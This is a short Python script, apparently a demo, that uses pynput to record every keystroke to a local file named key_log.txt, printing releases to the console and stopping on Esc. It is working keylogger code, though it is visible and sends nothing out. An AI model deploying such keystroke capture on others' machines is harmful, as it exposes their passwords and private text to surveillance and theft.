from pynput import keyboard

log_file = 'key_log.txt'

def on_press(key):
    try:
        with open(log_file, 'a') as f:
            f.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as f:
            f.write(f'\n{key}\n')

def on_release(key):
    print(f"Key {key} released")
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press, on_release) as listener:
    listener.join()